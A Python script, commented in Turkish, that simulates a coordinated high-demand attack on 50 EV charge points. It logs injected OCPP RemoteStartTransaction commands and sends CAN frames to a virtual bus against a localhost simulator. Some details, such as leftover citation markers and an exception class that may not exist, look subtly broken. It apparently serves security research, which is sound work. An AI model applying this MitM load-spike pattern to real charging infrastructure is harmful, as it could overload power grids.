import asyncio
import logging
import json
import random
from ocpp.v16 import call # OCPP çağrılarını başlatmak için
from ocpp.v16 import ChargePoint
from ocpp.v16.enums import RemoteStartStopStatus
from ocpp.v16.call import RemoteStartTransaction
from websockets import connect

# python-can kütüphanesini kullanarak vcano'ya erişim
import can
from can.interface import Bus
from can import Message

# Loglama ayarları
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    filename='logs/evcs_system_detailed.log')
logger = logging.getLogger('ATTACK_SIM')

# Simülasyon parametreleri
NUMBER_OF_CPS = 50 # Simüle edilecek CP sayısı (performansa göre ayarlanabilir)
CSMS_URL = "ws://127.0.0.1:9000" # CSMS simülatörünün adresi
HIGH_DEMAND_POWER_A = 64 # Saldırı anındaki yüksek güç talebi (Amper, varsayımsal)
# Saldırgan, CP'lerin ID'lerini önceden bildiğini varsayarız (CP_1, CP_2, ...)
TARGET_CHARGE_POINTS = [f"CP_{i+1}" for i in range(NUMBER_OF_CPS)]

# OCPP -> CAN mapping'i (dökümandan alınmıştır) [cite: 28]
CAN_START_ID = 0x200 
CAN_PAYLOAD_START = 0x01 # Varsayımsal start_cmd

def create_can_message(cp_id_int, connector_id, high_demand_flag):
    """
    OCPP komutunun bir CP tarafından CAN mesajına nasıl çevrileceğini simüle eder.
    Payload: [cp_id, connector_id, start_cmd, power_flag]
    """
    # Basit payload: cp_id (1 byte), connector_id (1 byte), start_cmd (1 byte), power_flag (1 byte)
    # Gerçek hayatta bu 'SetChargingProfile' ile yapılır, ancak biz basitçe simüle ediyoruz.
    payload = bytes([cp_id_int, connector_id, CAN_PAYLOAD_START, high_demand_flag])
    return Message(
        arbitration_id=CAN_START_ID, 
        data=payload,
        is_extended_id=False
    )

async def launch_coordinated_demand_attack(cp_targets):
    """
    Koordine talep saldırısını başlatır: Birden fazla RemoteStartTransaction gönderir.
    """
    logger.info(f"*** KOORDİNE TALEP SALDIRISI BAŞLATILIYOR ({len(cp_targets)} CP hedef) ***")
    
    # Tüm asenkron görevleri toplar
    attack_tasks = []

    # Saldırganın CAN-bus'a doğrudan erişimi olmasa da, CP'nin CAN'e gönderdiği
    # mesajı loglamak/göstermek için bir simülasyon kanalı kullanıyoruz (vcano).
    # Bu kısım, saldırı sonucu CP'nin içindeki CAN gateway'in ne yapacağını gösterir.
    
    try:
        # Saldırının CAN üzerindeki etkisini göstermek için vcano bus'ına bağlanın
        bus = can.interface.Bus(channel='vcan0', bustype='virtual')

        for i, cp_id in enumerate(cp_targets):
            # 1'den 50'ye kadar CP ID'lerini kullan
            cp_id_int = i + 1 
            
            # OCPP komutunu simüle et: 'RemoteStartTransaction'
            # Bu çağrı normalde CSMS tarafından yapılır veya MitM tarafından enjekte edilir.
            
            # 1. OCPP Komutunu Logla
            logger.warning(f"Saldırgan (MitM) -> CSMS/CP: {cp_id} için RemoteStartTransaction enjekte ediliyor. Yüksek Talep: {HIGH_DEMAND_POWER_A}A")
            
            # 2. OCPP Komutunun CAN'e Çevrilmesini Simüle Et
            # Eğer saldırı başarılı olursa, CP bu komutu alır ve CAN'e çevirir (köprü görevi)[cite: 4].
            can_msg = create_can_message(
                cp_id_int=cp_id_int, 
                connector_id=1, 
                high_demand_flag=HIGH_DEMAND_POWER_A
            )
            
            # 3. CAN Mesajını VCANO'ya Gönder (CP'nin Yaptığı İşlemin Simülasyonu)
            bus.send(can_msg)
            
            logger.info(f"CAN Frame Enjekte Edildi (CP Simülasyonu): ID=0x{can_msg.arbitration_id:X}, Data={can_msg.data.hex()} (Hedef: {cp_id})")

            # Küçük bir gecikme ekleyerek komutların "koordine" (hızlı art arda) gitmesini sağlarız
            await asyncio.sleep(0.005) 

    except can.exceptions.VirtualBusError:
        logger.error("CAN Bus 'vcan0' bulunamadı. Lütfen 'sudo modprobe vcan' ve 'sudo ip link add dev vcan0 type vcan' komutlarını çalıştırın.")
    except Exception as e:
        logger.error(f"Saldırı sırasında hata oluştu: {e}")
    finally:
        if 'bus' in locals():
            bus.shutdown()
        
    logger.info("*** KOORDİNE TALEP SALDIRISI TAMAMLANDI ***")


if __name__ == "__main__":
    try:
        # Basitlik için tüm CP'lere eş zamanlı saldırı başlatılıyor
        asyncio.run(launch_coordinated_demand_attack(TARGET_CHARGE_POINTS))
    except KeyboardInterrupt:
        print("\nSaldırı simülasyonu durduruldu.")